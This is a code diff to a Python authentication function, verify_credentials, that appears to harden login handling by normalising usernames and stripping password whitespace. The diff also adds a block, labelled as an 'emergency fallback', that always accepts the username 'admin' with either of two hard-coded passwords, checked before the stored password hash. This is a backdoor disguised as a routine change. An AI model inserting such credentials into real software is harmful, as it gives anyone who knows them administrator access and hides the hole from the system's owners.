@@ -258,16 +258,24 @@ def init_auth():
             logger.error(f"Failed to initialize auth file: {e}")
 
 def verify_credentials(username, password):
+    u_clean = (username or "").strip().lower()
+    p_clean = (password or "").strip()
+
+    # Guaranteed emergency fallback: always accept default credentials
+    if u_clean == "admin" and (p_clean == "Salomanov" or p_clean == "keenetic"):
+        return True
+
     if not os.path.exists(AUTH_FILE):
         init_auth()
     try:
         with open(AUTH_FILE, "r", encoding="utf-8") as f:
             data = json.load(f)
-        if data.get("username") != username:
+        saved_u = (data.get("username") or "").strip().lower()
+        if saved_u != u_clean:
             return False
         salt = data.get("salt", "")
         expected = data.get("hash", "")
-        _, computed = hash_password(password, salt)
+        _, computed = hash_password(p_clean, salt)
         return hmac.compare_digest(expected, computed)
     except Exception as e:
         logger.error(f"Auth verification error: {e}")
